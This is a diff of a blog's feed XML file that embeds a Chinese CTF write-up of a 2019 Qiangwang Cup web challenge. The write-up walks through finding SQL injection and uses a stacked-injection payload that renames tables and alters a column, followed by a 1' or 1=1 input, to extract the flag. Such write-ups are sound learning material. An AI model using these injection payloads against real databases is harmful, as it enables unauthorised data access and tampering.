@@ -18,8 +18,8 @@
     
     <entry>
       <title>WriteUp2</title>
-      <link href="2020/12/18/WriteUP2/"/>
-      <url>2020/12/18/WriteUP2/</url>
+      <link href="2020/12/18/WriteUp2/"/>
+      <url>2020/12/18/WriteUp2/</url>
       
         <content type="html"><![CDATA[<h1 id="强网杯-2019-web题"><a href="#强网杯-2019-web题" class="headerlink" title="强网杯 2019 web题"></a>强网杯 2019 web题</h1><p>  打开题目<br> <img src="https://i.loli.net/2020/12/18/1dUy56YohcNZEDS.png"></p><p>  发现是sql注入<br> <img src="https://i.loli.net/2020/12/18/OnaQGP2D9H5Vfke.png" alt="判断是否会报错"></p><p> <img src="https://i.loli.net/2020/12/18/4AzSvDTwk3l1OiR.png" alt="将后面的过滤掉"></p><p>  尝试用order by 和union select进行查看<br> <img src="https://i.loli.net/2020/12/18/7NmKCpGRUTBqf6a.png" alt="select的语句被过滤掉了"></p><p>  查询资料，尝试用堆叠注入<br> <img src="https://i.loli.net/2020/12/18/yslA5bqpBguLtnh.png" alt="尝试查看tables成功"></p><p>  其中有两个columns，分别查看<br> <img src="https://i.loli.net/2020/12/18/ulCHsR8ngG2UOa1.png" alt="查看words columns"></p><p> <img src="https://i.loli.net/2020/12/18/uwnx39QptRhO6JZ.png" alt="查看另外一个"><br>  发现flag，但是直接show flag会失败，查询资料后知道，返回的都是words columns；</p><p>  于是进行骚操作</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">rename</span> <span class="keyword">tables</span> <span class="string">`words`</span> <span class="keyword">to</span> <span class="string">`words1`</span>;<span class="keyword">rename</span> <span class="keyword">tables</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span>; <span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">change</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">varchar</span>(<span class="number">100</span>);%23</span><br></pre></td></tr></table></figure><p>  最后一步，1’ or 1=1 %23<br> <img src="https://i.loli.net/2020/12/18/KmkMOypidQGBU67.png"></p><blockquote><p> 得到flag！</p></blockquote>]]></content>
       
@@ -43,7 +43,7 @@
     
     
     <entry>
-      <title>第一篇文章</title>
+      <title>The first try</title>
       <link href="2020/12/17/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
       <url>2020/12/17/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
       
